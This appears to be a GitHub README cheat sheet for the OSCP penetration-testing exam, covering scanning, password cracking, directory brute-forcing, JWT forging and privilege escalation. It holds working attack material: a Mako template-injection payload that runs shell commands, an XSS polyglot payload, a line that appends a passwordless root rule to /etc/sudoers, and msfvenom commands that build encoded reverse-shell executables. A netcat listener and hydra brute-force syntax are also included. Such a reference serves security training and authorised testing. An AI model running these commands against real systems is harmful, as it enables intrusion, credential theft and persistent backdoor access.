# oscp-cheatsheet
This repository describes cheat sheet and knowledge for OSCP.

# Contents
<!-- START doctoc generated TOC please keep comment here to allow auto update -->
<!-- DON'T EDIT THIS SECTION, INSTEAD RE-RUN doctoc TO UPDATE -->
**Table of Contents**

- [oscp-cheatsheet](#oscp-cheatsheet)
- [Contents](#contents)
- [Enumeration](#enumeration)
  - [Network](#network)
    - [nmap](#nmap)
      - [Example](#example)
      - [Options](#options)
  - [RustNmap](#rustnmap)
  - [Windows Privilege Escalation](#windows-privilege-escalation)
    - [PowerUp.ps1](#powerupps1)
    - [Scan](#scan)
    - [SeImpersonatePrivilege](#seimpersonateprivilege)
      - [PrintSpoofer](#printspoofer)
  - [Linux Privilege Escalation](#linux-privilege-escalation)
    - [LinPEAS](#linpeas)
    - [pspy](#pspy)
- [Password Cracking](#password-cracking)
  - [hydra](#hydra)
      - [Example](#example-1)
  - [John the ripper](#john-the-ripper)
      - [Example](#example-2)
  - [hashcat](#hashcat)
  - [Webpages](#webpages)
    - [Hashes](#hashes)
    - [craskstation](#craskstation)
- [Brute Force Attack](#brute-force-attack)
  - [Directory](#directory)
    - [dirb](#dirb)
  - [File](#file)
      - [dirb](#dirb-1)
    - [gobuster](#gobuster)
  - [Directory](#directory-1)
    - [dirb](#dirb-2)
    - [gobuster](#gobuster-1)
  - [DNS subdomains](#dns-subdomains)
    - [gobuster](#gobuster-2)
      - [Wordlist example](#wordlist-example)
        - [bitquark-subdomains-top100000.txt](#bitquark-subdomains-top100000txt)
- [JWT (JSON Web Token) exploit](#jwt-json-web-token-exploit)
    - [Debugger](#debugger)
    - [jwt\_tool](#jwt_tool)
      - [tampering](#tampering)
      - [exploit](#exploit)
- [SSTI (Server-Side Template Injection)](#ssti-server-side-template-injection)
  - [PayloadsAllTheThings](#payloadsallthethings)
  - [How to identify the Vulnerability SSTI?](#how-to-identify-the-vulnerability-ssti)
    - [Mako](#mako)
      - [RCE](#rce)
- [SQL Injection](#sql-injection)
  - [PayloadsAllTheThings](#payloadsallthethings-1)
    - [Insert Statement injection using ON DUPLICATE KEY UPDATE](#insert-statement-injection-using-on-duplicate-key-update)
- [XSS](#xss)
  - [Polyglot](#polyglot)
- [Aggregating Sensitive Information](#aggregating-sensitive-information)
  - [truffleHog](#trufflehog)
    - [Scan GitHub](#scan-github)
- [Fuzz](#fuzz)
  - [fuff](#fuff)
    - [Basic usage](#basic-usage)
    - [Special Character Fuzz](#special-character-fuzz)
- [Linux command](#linux-command)
  - [Basic command](#basic-command)
    - [Show allowing commands as root user](#show-allowing-commands-as-root-user)
    - [Run command as other user](#run-command-as-other-user)
    - [Show file type](#show-file-type)
    - [Show the strings of printable characters in files](#show-the-strings-of-printable-characters-in-files)
    - [Read from standard input and write to standard output and files](#read-from-standard-input-and-write-to-standard-output-and-files)
    - [rlwrap](#rlwrap)
      - [nc (Listen port 9001)](#nc-listen-port-9001)
  - [Disable password checking for sudo](#disable-password-checking-for-sudo)
  - [Docker](#docker)
    - [Get a subsection in JSON format](#get-a-subsection-in-json-format)
  - [SUID](#suid)
  - [DNS](#dns)
    - [Specify referred DNS server](#specify-referred-dns-server)
  - [String Processing](#string-processing)
    - [Remove white spaces](#remove-white-spaces)
  - [SMB](#smb)
    - [smbclient](#smbclient)
- [Windows command](#windows-command)
  - [Powershell](#powershell)
    - [Create New file](#create-new-file)
    - [Display the contents of a text file](#display-the-contents-of-a-text-file)
    - [Get a file via HTTP (equivalent to wget)](#get-a-file-via-http-equivalent-to-wget)
- [Python Standard Library](#python-standard-library)
  - [Run HTTP Server](#run-http-server)
    - [python3](#python3)
    - [python2](#python2)
- [Reverse shell](#reverse-shell)
  - [php-reverse-shell](#php-reverse-shell)
  - [Reverse shell cheat sheet](#reverse-shell-cheat-sheet)
  - [Metasploit](#metasploit)
- [Metasploit](#metasploit-1)
  - [meterpreter](#meterpreter)
  - [Get system info](#get-system-info)
    - [Start shell](#start-shell)
    - [Upload file from Metasploit host to target](#upload-file-from-metasploit-host-to-target)
    - [Download file from target to Metasploit host](#download-file-from-target-to-metasploit-host)
    - [Load powershell and run](#load-powershell-and-run)
  - [msfvenom](#msfvenom)
    - [Windows](#windows)
      - [exe](#exe)
      - [exe-service](#exe-service)
  - [BurpSuite](#burpsuite)
    - [Hot Keys](#hot-keys)
- [Others](#others)
  - [References for OSCP](#references-for-oscp)
    - [GTFOBins](#gtfobins)
  - [Word List](#word-list)
    - [SecLists](#seclists)
    - [Reverse shell cheat sheet](#reverse-shell-cheat-sheet-1)
      - [php-reverse-shell](#php-reverse-shell-1)
      - [Groovy Reverse shell](#groovy-reverse-shell)
    - [HTML Security CheatSheet](#html-security-cheatsheet)
  - [References for vulnerabilities](#references-for-vulnerabilities)
    - [Shellshock (CVE-2014-6271)](#shellshock-cve-2014-6271)
  - [Kali linux on docker for Mac](#kali-linux-on-docker-for-mac)
- [LICENSE](#license)

<!-- END doctoc generated TOC please keep comment here to allow auto update -->
# Enumeration
## Network
### nmap
#### Example
```console
nmap -sV -T4 -Pn <Target IP Address>
```
#### Options
`-sV`: Show opening ports and running services.  
`-T4`: Prohibit the dynamic scan delay from exceeding 10ms for TCP ports  
`-Pn`: Disable sending ping packets to discover a host  
`-A`: Detect OS and its version.  
`-p`: Specify range of ports. Scan all ports (1-65535) if using the option `-p-`  

## RustNmap
This tool is faster tool than nmap.
https://github.com/RustScan/RustScan

```
rustscan -a <target ip> -- <nmap options>
```


## Windows Privilege Escalation
### PowerUp.ps1
This script enumerates the privileges vulnerabilities in Windows 
https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1

### Scan
```console
. .\PowerUp.ps1
Invoke-PrivescAudit [-HTMLReport]
```
Note that this tool output "COMPUTER.username.html" if the `-HTMLReport` is enabled.

### SeImpersonatePrivilege
#### PrintSpoofer
https://github.com/itm4n/PrintSpoofer

## Linux Privilege Escalation
### LinPEAS
LinePEAS is a script which detect the possible path to escalate privilege on Linux etc...
```
https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS
```

### pspy
Monitoring process tool in real time.
```
https://github.com/DominicBreuker/pspy
```

# Password Cracking
## hydra
#### Example
- Brute force attack for username and password (HTTP POST)
```console
hydra -L <username list file> -P <password list file> <ip address> http-post-form '<path>:<query parameter>:<string when failing login>'  
```
- Brute force attack for the password (HTTP POST)
```console
hydra -l <username> -P <password list file> <ip address> http-post-form '<path>:<query parameter>:<string when failing login>'
```
We can set the following variables when specifying the list file:  
`^USER^`: Replace this string in \<query parameter\> with the username listed in \<username list file\>  
`^PASSWORD^`: Replace this string in \<query parameter\> with the password listed in \<password list file\>

## John the ripper
A tool to get the plain password from hashed one.

#### Example
```
john --wordlist=rockyou.txt hash.txt
```

## hashcat
A tool to get the plain password from hashed one.
```
hashcat -m <mode> -o <output file> <hashed password file> <wordlist file>
```
Modes are defined in the following page.
https://hashcat.net/wiki/doku.php?id=example_hashes

For example, if we want to decrypt SHA-512 hash value + salt by using rockyou.txt, we should run the following command:
```
hashcat -m 1710 -o cracked.txt hash.txt rockyou.txt
```
, then, the above command outputs cracked password to cracked.txt.


## Webpages 
Webpages to get the plain password from hashed one, as follows:
### Hashes
https://hashes.com/en/decrypt/hash

### craskstation
https://crackstation.net/

# Brute Force Attack
## Directory
### dirb
```
dirb <target URL>
```

## File
#### dirb
```
dirb <targetURL> -X <extension list separated by comma (e.g. .sh, .pl, .txt, .php, .py)>
```

### gobuster
```
gobuster dir -x .sh, .pl, .txt, .php, .py -u <target url> -w /usr/share/wordlists/dirb/common.txt -t 100
```

## Directory
### dirb
```
dirb <target url>
```

### gobuster
```
gobuster dir -u <target url> -w /usr/share/wordlists/dirb/common.txt -t 100
```
## DNS subdomains
### gobuster
```
gobuster dns -d <domain name> -w <dns subdomains wordlist>
```
#### Wordlist example
##### bitquark-subdomains-top100000.txt
https://github.com/danielmiessler/SecLists/blob/master/Discovery/DNS/bitquark-subdomains-top100000.txt


# JWT (JSON Web Token) exploit

### Debugger
This website provides decoding JWT and editing the payload in decoded JWT.  
https://jwt.io/

### jwt_tool
This tool helps us to validate, tamper, and forge JWTs for a pentester.  
https://github.com/ticarpi/jwt_tool


#### tampering
```
python jwt_tool.py <JWT> -T
```

#### exploit
```
python jwt_tool.py <JWT> -X <parameter>
```
The parameter can be specified as follow:  
`a`: alg:none  
`n`: null signature  
`b`: blank password accepted in signture  
`s`: spoof JWKS  
`k`: key confusion  
`i`: inject inline JKWS  

# SSTI (Server-Side Template Injection)
## PayloadsAllTheThings
https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/README.md

## How to identify the Vulnerability SSTI?
```
${{<%[%’”}}%\.
```
https://medium.com/@aslam.mahimkar/hackthebox-busqueda-writeup-c4ae57a89fd4

### Mako
#### RCE
``` shell
${self.module.cache.util.os.popen("cat /flag.txt").read()}
```

# SQL Injection
## PayloadsAllTheThings
https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection

### Insert Statement injection using ON DUPLICATE KEY UPDATE
https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection#insert-statement---on-duplicate-key-update

# XSS
## Polyglot
The following script includes multiple payloads to improve the test efficiency.
```shell
jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e
```
https://github.com/0xsobky/HackVault/wiki/Unleashing-an-Ultimate-XSS-Polyglot

# Aggregating Sensitive Information
## truffleHog
This tool gets high entropy strings (e.g. Password, APIKey, etc...).
https://github.com/trufflesecurity/trufflehog
### Scan GitHub
Docker
``` shell
docker run --rm -it -v "$PWD:/pwd" trufflesecurity/trufflehog:latest github --repo <Repository URL></Repository>
```

# Fuzz
## fuff
### Basic usage
```
fuff -request <request file> -request-proto http -w <wordlist (e.g. SecList)>
```
### Special Character Fuzz
```
fuff -request test.req -request-proto http -w /usr/share/seclists/Fuzzing/special-chars.txt
```

# Linux command

## Basic command
### Show allowing commands as root user
```
sudo -l
```

### Run command as other user
```
sudo -u <user> <command>
```
e.g.
```
sudo -u <user> /bin/bash
```
### Show file type
```
file <file name>
```

### Show the strings of printable characters in files
```
strings <file name>
```

### Read from standard input and write to standard output and files
```
echo <text> | tee -a <file>
```

### rlwrap
https://linux.die.net/man/1/rlwrap
#### nc (Listen port 9001)
```
rlwrap -cAr nc -lnvp 9001
```

## Disable password checking for sudo
```
echo "<username> ALL=(root) NOPASSWD: ALL" >> /etc/sudoers
```

## Docker
### Get a subsection in JSON format
https://docs.docker.com/reference/cli/docker/inspect/
```
docker inspect --format='{{json .Config}}' $INSTANCE_ID
```

## SUID
The privileged mode can be run if the suid for the script is enabled. 
For example, if we want to run the script, named '.suid_bash', with root privilege, 
```
-rwsr-sr-x 1 root  root  1113504 Jul 22  2020  .suid_bash
```
we should run the following command: 
```
./.suid_bash -p
```
https://stackoverflow.com/questions/63689353/suid-binary-privilege-escalation


## DNS
### Specify referred DNS server
```
nslookup
server <DNS Server>
```

## String Processing
### Remove white spaces
```
sed 's/ //g'
```

## SMB
### smbclient
```console
smbclient -L <target>  # Enumerate sharenames
smbclient //<target>/<sharename>
get <filename>
```

# Windows command
## Powershell
### Create New file
```
New-Item <filename> -Type File
```

### Display the contents of a text file
```
type <filename>
```

### Get a file via HTTP (equivalent to wget)
```
Invoke-WebRequest -Uri http://example.com/file.zip -OutFile C:\path\to\save\file.zip
```
```
iwr http://example.com/file.zip -OutFile C:\path\to\save\file.zip
```


# Python Standard Library
## Run HTTP Server
### python3
```
python -m http.server <port>
```
### python2
```
python -m SimpleHTTPServer <port>
```

# Reverse shell
## php-reverse-shell
```
https://pentestmonkey.net/tools/web-shells/php-reverse-shell
```

## Reverse shell cheat sheet
https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md

## Metasploit
Refer  [msfvenom](#msfvenom)
# Metasploit
## meterpreter
## Get system info
```
sysinfo
```
### Start shell
```
shell
```

### Upload file from Metasploit host to target
```
upload <filepath>
```

### Download file from target to Metasploit host
```
download <filepath>
```

### Load powershell and run
```
load powershell
powershell_shell
```
## msfvenom
This tool creates a payload, such as reverse shell, embedded in a file.

### Windows
#### exe
```
msfvenom -p windows/shell_reverse_tcp LHOST=<lhost> LPORT=<lport> -e x86/shikata_ga_nai -f exe -o evil.exe
```
#### exe-service
```
msfvenom -p windows/shell_reverse_tcp LHOST=<lhost> LPORT=<lport> -e x86/shikata_ga_nai -f exe-service -o evil.exe
```

## BurpSuite
### Hot Keys
https://github.com/rinetd/BurpSuite-1/blob/master/CheatSheet.md

# Others

## References for OSCP
### GTFOBins
This website is a curated list of Unix binaries that can be used to bypass local security restrictions in misconfigured systems.  
https://gtfobins.github.io/

## Word List
### SecLists
https://github.com/danielmiessler/SecLists

### Reverse shell cheat sheet
https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md
#### php-reverse-shell
https://github.com/pentestmonkey/php-reverse-shell

#### Groovy Reverse shell
https://gist.github.com/frohoff/fed1ffaab9b9beeb1c76

NOTE: This shell is abused in Jenkis Groovy Script Console.
https://blog.pentesteracademy.com/abusing-jenkins-groovy-script-console-to-get-shell-98b951fa64a6

### HTML Security CheatSheet
https://html5sec.org/
This cheat sheet shows the XSS payloads against each browser.

## References for vulnerabilities
### Shellshock (CVE-2014-6271)
https://blog.cloudflare.com/inside-shellshock/

## Kali linux on docker for Mac
https://5kyr153r.hatenablog.jp/entry/2022/11/14/104548 (Japanese)
https://www.kali.org/docs/general-use/novnc-kali-in-browser/






# LICENSE
MIT

